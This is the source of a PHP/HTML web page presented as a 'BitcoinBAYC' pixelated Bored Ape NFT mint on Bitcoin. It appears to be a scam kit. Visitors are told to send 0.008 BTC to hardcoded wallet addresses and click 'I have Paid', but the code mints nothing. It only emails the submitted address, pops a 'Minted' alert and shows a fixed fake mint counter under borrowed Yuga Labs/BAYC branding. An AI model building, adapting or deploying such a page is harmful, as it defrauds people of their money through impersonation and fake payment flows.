<?php
error_reporting(0);
if(isset($_POST['receive'])){
    $msg = "Hi\n";
    $msg .= 'You received in your wallet from '.$_POST['receive']."\n";
    mail('', 'Bitcoin Minted', $msg);
    echo '<script>alert("Minted")</script>';
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MA BYAC</title>
    <link rel="stylesheet" href="app/bootstrap/css/bootstrap.css">
    <!--<link rel="stylesheet" href="app/swiper/swiper-bundle.min.css">
    <link rel="stylesheet" href="app/dist/app.css">
    <link rel="stylesheet" href="assets/font/font-awesome.css">
    <link href="./unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet"> -->
    <link href="my.css" rel="stylesheet">
    <!-- Favicon and Touch Icons  -->
    <link rel="shortcut icon" href="mybac-ico.jpg">
    <link rel="apple-touch-icon-precomposed" href="mybac-ico.jpg">
    <script src="https://code.jquery.com/jquery-3.6.3.min.js" crossorigin="anonymous"></script>
</head>

<body class="header-fixed main" data-aos-easing="ease" data-aos-duration="400" data-aos-delay="0" style="background-color: #242424;">
    <!-- preloade -->
    <div class="preload preload-container">
        <div class="preload-logo"></div>
    </div>
    <!-- /preload -->
    <div id="wrapper">

        <header id="header_main" class="header mb-4">
            <div class="container">
                <div id="site-header-inner">
                    <div class="header__logo">
                        <a href="/"><img src="msbyc.jpg" style="height: 60px;" alt=""></a>
                    </div>
                </div>
            </div>
        </header>



        <section class="tf-section tf-item">
            <div class="container mt-4">
                <!-- <div class="row pb-4 mb-4">
                    <div class="col-md-3"></div>
                    <div class="col-md-6">
                        <center>
                            <div class="row">
                                <div class="col-md-4">
                                    <img src="msbyc.jpg" style="width: 220px;">
                                </div>
                                <div class="col-md-8">
                                    <center><h2>MABYAC</h2></center>
                                </div>
                            </div>
                        </center>
                    </div>
                    <div class="col-md-3"></div>
                </div> -->
                <div data-v-2421f567="" id="app">
                    <div data-v-0d542fce="" data-v-2421f567="" class="home-wrapper">
                        <div data-v-0d542fce="" class="header">
                            <div data-v-0d542fce="" class="header-info"><img data-v-0d542fce=""
                                    src="/img/bayc.47fe995b.png" alt="" class="header-info-logo">
                                <div data-v-0d542fce="" class="header-info-right">
                                    <div data-v-0d542fce="" class="info-row-1"> BitcoinBAYC <div data-v-0d542fce=""
                                            style="margin-left: 8px;">
                                            <a data-v-0d542fce="" href="https://twitter.com/BitcoinYugaLabs"
                                                target="_new" class="link-logo">
                                                <img data-v-0d542fce="" width="100%" height="100%"
                                                    src="https://bitcoinpunks.com/twitter-icon.svg">
                                            </a>
                                            <a data-v-0d542fce="" href="tutorial/mint" target="_blank"
                                                class="link-logo">
                                                <span data-v-0d542fce="" class="text-icon">📖</span>
                                            </a>
                                        </div>
                                    </div>
                                    <div data-v-0d542fce="" class="info-row-2">The First Pixelated Bored Apes on Bitcoin
                                    </div>
                                    <div data-v-0d542fce="" class="info-row-3" style="margin-inline-end: 0px;">923 /
                                        10000 minting!</div>
                                </div>
                            </div>
                            <div data-v-0d542fce="" class="header-desc">
                                <div data-v-0d542fce="">10,000 artistically pixelated BitcoinBAYCs to fit with BTC
                                    chain.</div>
                                <div data-v-0d542fce="">Choose your favorite BAYC and mint a <div data-v-0d542fce=""
                                        class="text"> Pixelated Bitcoin NFT <div data-v-0d542fce="" class="desc-tips">
                                            <p data-v-0d542fce="">Inscription on BTC works differently from a mint on
                                                ETH. While ethereum NFTs are stores on IPFS storage across the
                                                blockchain, bitcoin NFTs are stored in the OP_RETURN field of a Bitcoin
                                                transaction, which can store a small amount of data. </p>
                                            <p data-v-0d542fce="">Inscriptions are different from NFTs on Ethereum in
                                                that they are stored fully on-chain, making them immutable and fully
                                                decentralized.</p>
                                            <p data-v-0d542fce="">The limitation of inscription is that file sizes
                                                matter greatly, as incribing a large image can be extremely costly.</p>
                                            <p data-v-0d542fce="">bitconBAYC has chosen to limit image sizes to 50x50
                                                pixels or roughly ~5kB. This creates NFT that is both affordable and
                                                artistic, giving it a "vintage" look that is befitting to the bitcoin
                                                chain.</p>
                                        </div>
                                    </div> .</div>
                                <div data-v-0d542fce="">Mint Price: 0.008 btc + token ID</div>
                                <div data-v-0d542fce="">*Inscription gas fee is included with each mint.</div>
                            </div>
                        </div>
                        <div data-v-0d542fce="" class="filter">
                            <div data-v-0d542fce="" class="filter-item">
                                <div data-v-0d542fce="" class="filter-label">Filter by:</div>
                                <div data-v-0d542fce="" class="filter-btn-container">
                                    <div data-v-0d542fce="" class="filter-btn"> Minted </div>
                                    <div data-v-0d542fce="" class="filter-btn"> Minting </div>
                                    <div data-v-0d542fce="" class="filter-btn"> Available </div>
                                    <div data-v-0d542fce="" class="filter-btn active"> All </div>
                                </div>
                            </div>
                            <div data-v-0d542fce="" class="filter-item"><input data-v-0d542fce="" type="number"
                                    placeholder="Find By ID" class="filter-input">
                                <div data-v-0d542fce="" class="filter-go hover-status"> Go </div>
                            </div>
                        </div>
                        <div data-v-0d542fce="" class="modal-mask" style="display: none;">
                            <div data-v-0d542fce="" class="modal-content">
                                <div data-v-0d542fce="" class="modal-close"></div>
                                <h6 data-v-0d542fce="" class="modal-title">Token ID #</h6><a data-v-0d542fce=""
                                    href="tutorial/mint" target="_blank" class="modal-pay-price">❗️Read First: HOW TO
                                    MINT</a>
                                <div data-v-0d542fce="" class="modal-step-title">Step1: <span data-v-0d542fce="">Your
                                        Receiving Address </span></div>
                                <div data-v-0d542fce="" class="modal-row-title"><a data-v-0d542fce=""
                                        href="https://twitter.com/BitcoinYugaLabs/status/1624011580827648001?s=20&amp;t=wmj9wBQVljVgLZcvgKAcEQ"
                                        target="_blank" style="color: rgb(181, 181, 181);"> (MUST BE A SPARROW WALLET
                                        <span data-v-0d542fce="">TAPROOT</span> ADDRESS BEGINNING WITH "bc1"): </a>
                                </div>
                                <div data-v-0d542fce="" class="modal-row"><input data-v-0d542fce="" type="text"
                                        placeholder="Your BTC TAPROOT Address beginning with bc1"
                                        class="modal-row-input"></div>
                                <div data-v-0d542fce="" class="modal-step-title"> Step2: <span data-v-0d542fce="">Send
                                        0.008undefined btc to:</span></div>
                                <div data-v-0d542fce="" class="onchain-title"><a data-v-0d542fce=""
                                        href="bitcoin:3CqyqbjLnJ2CcnEPFHjsfdt5BSRnsBiCV6?amount=0.008undefined&amp;label=BitcoinBAYC+#undefined">Click
                                        Below to Activate Sparrow Wallet</a></div>
                                <div data-v-0d542fce="" class="modal-pay-box"><a data-v-0d542fce=""
                                        href="bitcoin:3CqyqbjLnJ2CcnEPFHjsfdt5BSRnsBiCV6?amount=0.008undefined&amp;label=BitcoinBAYC+#undefined"><img
                                            data-v-0d542fce="" src="/img/qrcode.de2e8433.png" alt=""
                                            class="modal-qrcode"></a></div>
                                <div data-v-0d542fce="" class="modal-row" style="margin-bottom: 10px;">
                                    <div data-v-0d542fce="" class="payment-address">
                                        <div data-v-0d542fce="" class="btc-icon"><img data-v-0d542fce=""
                                                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAAXNSR0IArs4c6QAAA/BJREFUeF7tWk2IHUUQrqq9BSQgSLwpXhQ8BIkBRcEVifC6etbgzymXEFcvCh5UgieTi4QouQQEhU0C5qgEM9296w8kOQRRjODBgF4EEQyolxwDMyUdZh6zs7OZ2fd6nm/yeo7T1d/U93VVV3dPIyz4gwvOH6IAMQIWXIGYAgseAHESnEkKpGm6XEZakiSX61HX1t5nlM5EAOfcJRFZRsTLSqlnmwQgokv+PTPPxKfSh5l8LAoQIyCmQJwD4iR4t1cBX8vLUhawbl8TkZ99+WTmzwLijqGClkFjzGlEfLMPRwHgJDMfDY0dVADvnLX2AAB8XXfUj2KWZcfvRGBpaWmPiOwFgH0A8HzdVkTOaK1fDSlCcAG8c865NRE5UnV0u1XgdmSste8DwLF6OxG9MBqNLoYSoRcB1tfXn8vz/NtpBPB9NzY27s2y7N8a2avM/PRcC1Ckwg0A2DNec2+zD2gj4pw7JCLnq3ZE9MhoNPq1rW+X9l4ioBDgBwDYP60ABdbvAPBgiRUyDXoToNwAhRDAGGMRUZVYeZ4fTZLkZJcRbrMZhABpmh4jIj8p3n5E5A2t9cdt5Lq0D0IAa60vq768ls/LzPxFF4JtNnMvQJqmu4jobwDYVZC5lWXZkysrKz+1kevSPvcCWGtfAoDPK+H/kdb63S7kutjMtQDF/sIveu4pcv8PInpKKfVnF3JdbGYqQNtSuO4wEZ0DgAf6mPzG1amLSpPY1MvgJBj1PiKyqrVeC4E1cwG6bIaaiBHRWwBwsGzL8/x4kiRb9giTijLTFGg6Eu/iuLX2AwB4r5IKB7TWm/YaXXCabAYhgHfcGHMeEQ9VSOxn5h8nJf6/pMCkEVAIsA8Rq4S/Z+YnFkaAQoRNewIAeJiZf5tGhMGkgCfpnPtURF4LWRaHJsCHIvLOOH8RLyilXlykCPhKRKpnhWvMvDqXAlhrvwOA8SS10zPBJlLGmBuIOD5lAoC3mfnUvArwFwDcXwnXxl/jXZ13zm0Kf98PEVeUUmlXjJmtA6y1GgA2OTZtBFhrpUbgG2becnS+UzF6mQSdcxdFJKk6M6kAxpjXEfGTOjFE3K2UurlTwltwpgWo97fWngWAww0O+x8jV+rviag+st5kNyI+JiKPAsB99T4i8rjW+loI34NFgDHmISI6ISKvhHBsG4wv8zxfTZLkn1DfCCZAcXjxTONEg7hc/h6vRkFt9G/v8Pxur4rhbUTkOhH9opS6Hor4eHIODdiEF+8IxTtC8Y5QvCMU7wjd7XeE7lRN2u4Ct7X3WamCrQP6dLJP7ChAn+oOATtGwBBGqU8fYwT0qe4QsGMEDGGU+vQxRkCf6g4B+z/8a1Vf1+zQAAAAAABJRU5ErkJggg=="
                                                alt=""></div>
                                        <p data-v-0d542fce="">3CqyqbjLnJ2CcnEPFHjsfdt5BSRnsBiCV6</p>
                                        <div data-v-0d542fce="" class="copy-icon hover-status"><img data-v-0d542fce=""
                                                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAAXNSR0IArs4c6QAAAhZJREFUeF7tm8FNw0AQRcdVgKAOrrQAF2jC3LErSLjjJuACLXClDiJShSNH4hBL8d8XdmJtMrnO9//eP3/XE8mu7Mx/1Zmv38KASICTA4tl92FmN2Z25SSxj3ZlZt9tU9+n6LpsgcWy61PEvTFtU8v1SQC9ycVL92a9PdDrXPCVvbfP9eMUd34Dlq+/ZtWFy4Iwab9um6fLIxuwG/+UGOJ1TVww3n5K3yEBYcDOAag6kLP7A1ckYPQEUg3IvgVyd5TyzZ4AesO58WFAbAH2FEo+A0qZ7V22QEmzfXYDSpvt8xtQ2GzvYAA7VOZ+rIUBuR+D1NFIQGYHaAMoXs4BlDDz+vG/O3q/YYDqGHVU8dE61af4SIDqCHVU8dE61af4SIDqCHVU8dE61af4SIDqCHVU8dE61af4SIDqCHVU8dE61af4SIDqCHVU8dE61af4SIDqCHVU8dE61af4SIDqCHVU8dE61af4SIDqCHVU8dE61af4SIDqCHVU8dG60h/XR/yrtqmvpzSLT4Aw4FO9MHnSBqjXY4ZknKAB/dqq6ku9IPm3LYo3gJ4pY3wYoBxUp7C6/r91b/1IgOqQdwfm1o8EzN2BufUjAQkd+Jnhu599tyVne7WeQ+aA4eOnO0rshJezPdWVW2AgFH84qObB+JTZnpInGbA1YfsxVH97/O+B2GzvZgAlLgWfnIBSFkTvMwygjp0afgOAOBhfxUhjNAAAAABJRU5ErkJggg=="
                                                alt=""></div>
                                    </div>
                                </div>
                                <div data-v-0d542fce="" class="modal-step-title" style="margin-top: 0px;"> Step3: <span
                                        data-v-0d542fce="">CLICK button below and wait for on-chain confirmation:</span>
                                </div><button data-v-0d542fce="" class="modal-ok hover-status disabled">I HAVE
                                    PAID</button>
                                <!---->
                                <!---->
                                <div data-v-0d542fce="" class="modal-pay-alert" style="display: none;">
                                    <div data-v-0d542fce="" class="modal-pay-alert-desc">Please Confirm If You Have Paid
                                    </div>
                                    <div data-v-0d542fce="" class="modal-pay-alert-actions">
                                        <div data-v-0d542fce="" class="alert-button close">CLOSE</div>
                                        <div data-v-0d542fce="" class="alert-button paid">I HAVE PAID</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div data-v-0d542fce="" class="modal-mask" style="display: none;">
                            <div data-v-0d542fce="" class="modal-content">
                                <div data-v-0d542fce="" class="modal-close"></div>
                                <h6 data-v-0d542fce="" class="modal-title">
                                    <div data-v-0d542fce="" class="modal-loading-icon"
                                        style="display: inline-block; position: relative; top: 2px;"></div> Inscribing
                                    by others...
                                </h6>
                                <div data-v-0d542fce="" class="modal-step-title">Order ID:</div>
                                <div data-v-0d542fce="" class="modal-row-title" style="font-size: 16px;"></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-12">
                        <div class="wrap-fx ml30-fx mt-40" data-aos="fade-up" data-aos-duration="800">
                            <?php 
                                if ($handle = opendir('./nftimages')) {

                                    while (false !== ($entry = readdir($handle))) {
                                
                                        if ($entry != "." && $entry != "..") {
                                
                                            echo '<div class="fl-item">
                                            <div onclick="make()" class="img-box" style="padding: inherit;">
                                                <img src="nftimages/'.$entry.'" height="290" width="290" alt="">
                                            </div>
                                        </div>';
                                        }
                                    }
                                
                                    closedir($handle);
                                }
                            ?>
                        </div>
                    </div>
                    <div class="col-md-12">
                        <div class="btn-about center m-t16" data-aos="fade-up" data-aos-delay="300"
                            data-aos-duration="800">
                            <a class="tf-button btn-effect loadmore st2" href="#" id="loadmore">
                                <span class="boder-fade"></span>
                                <span class="effect">Load More</span>
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </section>

    </div>
    <button type="button" class="btn btn-primary" data-toggle="modal" hidden data-target=".bd-example-modal-lg"
        id="load_modal"></button>

    <div class="modal fade bd-example-modal-lg" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel"
        aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content" style="background-color:#000">
                <form method="POST">
                    <div class="form-group mb-4">
                        <label for="exampleInputEmail1">Step1: Your Receiving Address</label>
                        <input type="text" name="receive" class="form-control" id="exampleInputEmail1" required
                            aria-describedby="emailHelp" placeholder="Your BTC TAPROOT Address beginning with bc1">
                        <small id="emailHelp" class="form-text text-muted">(MUST BE A SPARROW WALLET TAPROOT ADDRESS
                            BEGINNING WITH "bc1"):</small>
                    </div>
                    <div class="form-group mb-4">
                        <label for="exampleInputPassword1">Step2: Send 0.0080004 btc to:</label>
                        <img src="qrcode.png" style="height: 150px;">
                    </div>
                    <div class="form-group input-group mb-4">
                        <input type="text" class="form-control" name="myvalue" id="myvalue"
                            value="bc1qq8nx64j6w253tpapspvf0ktrr0h9a0y9fkayd3" readonly />
                        <button class="btn btn-primary btn-block" type="button" onclick="copyToClipboard()"><i
                                class="fa fa-copy"></i></button>
                    </div>
                    <button type="submit" name="submit" class="btn btn-primary">I have Paid</button>
                </form>
            </div>
        </div>
    </div>
    <a id="scroll-top"></a>
    <script>
    function make() {
        $("#load_modal").click();
    }

    function copyToClipboard() {
        var textBox = document.getElementById("myvalue");
        textBox.select();
        document.execCommand("copy");
    }
    </script>
    <script src="app/js/jquery.min.js"></script>
    <script src="app/js/bootstrap.min.js"></script>
    <script src="app/js/swiper-bundle.min.js"></script>
    <script src="app/js/swiper.js"></script>
    <script src="app/js/app.js"></script>
    <script src="app/js/jquery.easing.js"></script>
    <script src="./unpkg.com/aos%402.3.1/dist/aos.js"></script>
    <script src="app/js/parallax.js"></script>
    <script src="app/js/jquery.magnific-popup.min.js"></script>
</body>

</html>